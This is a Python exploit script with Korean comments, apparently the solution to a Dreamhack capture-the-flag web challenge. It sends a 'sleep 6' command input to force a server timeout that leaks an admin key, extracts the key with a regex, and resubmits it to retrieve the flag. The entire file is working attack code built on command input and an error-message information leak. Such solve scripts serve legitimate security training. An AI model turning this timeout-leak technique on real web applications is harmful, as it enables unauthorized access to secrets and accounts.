import requests
import re
import sys

# 문제 서버 주소 (필요시 포트를 맞춰서 수정해주세요)
URL = "http://host8.dreamhack.games:21889/flag"

def main():
    print(f"[*] Target URL 설정됨: {URL}")
    print("-" * 50)
    print("[*] Step 1: 'sleep 6' 명령어를 전송하여 TimeoutExpired 예외를 유도합니다.")
    print("[*] 이 과정을 통해 숨겨진 Admin KEY 값을 유출시킵니다.")
    
    # timeout을 일으킬 데이터 
    payload_step1 = {
        "key": "dummy_key", 
        "cmd_input": "sleep 6"
    }
    print(f"[*] Step 1 전송 데이터: {payload_step1}")
    
    try:
        # 서버에서 6초를 대기하므로, requests의 timeout은 넉넉하게 10초로 잡습니다.
        res1 = requests.post(URL, data=payload_step1, timeout=10)
        print(f"[+] Step 1 서버 응답 코드: {res1.status_code}")
        print(f"[*] Step 1 서버 응답 본문:\n{res1.text.strip()}")
        
        # 정규표현식으로 KEY 값 추출 (MD5 해시는 32자리 16진수)
        match = re.search(r"Timeout! Your key: ([a-f0-9]{32})", res1.text)
        if match:
            admin_key = match.group(1)
            print(f"\n[+] 성공! Admin KEY 값을 추출했습니다: {admin_key}")
        else:
            print("\n[-] Admin KEY 추출에 실패했습니다. 서버가 내려갔거나 응답이 다릅니다.")
            sys.exit(1)
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Step 1 요청 중 에러 발생: {e}")
        sys.exit(1)

    print("-" * 50)
    print("[*] Step 2: 획득한 Admin KEY 값을 사용해 실제 FLAG를 요청합니다.")
    
    # 획득한 키값과 빈 cmd 값을 전송 
    payload_step2 = {
        "key": admin_key,
        "cmd_input": ""
    }
    print(f"[*] Step 2 전송 데이터: {payload_step2}")
    
    try:
        res2 = requests.post(URL, data=payload_step2)
        print(f"[+] Step 2 서버 응답 코드: {res2.status_code}")
        print(f"[*] Step 2 서버 응답 본문(일부):\n{res2.text[:300]}...")
        
        # 정규표현식으로 DH{...} 형태의 플래그 추출
        flag_match = re.search(r"(DH\{.*?\})", res2.text)
        if flag_match:
            print("\n" + "=" * 50)
            print(f"[🎉] FLAG 발견 완료: {flag_match.group(1)}")
            print("=" * 50)
        else:
            print("\n[-] 플래그를 찾지 못했습니다. 전체 HTML을 확인해보세요:")
            print(res2.text)
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Step 2 요청 중 에러 발생: {e}")

if __name__ == "__main__":
    main()